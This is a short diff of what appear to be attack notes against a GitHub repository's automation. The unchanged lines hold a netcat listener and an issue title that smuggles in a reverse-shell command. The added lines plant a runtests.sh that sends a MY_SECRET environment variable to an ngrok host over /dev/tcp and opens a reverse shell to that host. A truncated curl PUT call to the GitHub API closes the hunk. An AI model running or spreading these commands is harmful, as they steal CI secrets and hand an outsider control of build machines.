@@ -3,6 +3,10 @@ sudo nc -lvk 1000
 
 New malicious issue title" && bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/18328 0>&1 && echo "
 
+runtests.sh:
+env | grep MY_SECRET > /dev/tcp/4.tcp.eu.ngrok.io/18328
+bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/18328 0>&1
+
 curl -L \
   -X PUT \
   -H "Accept: application/vnd.github+json" \
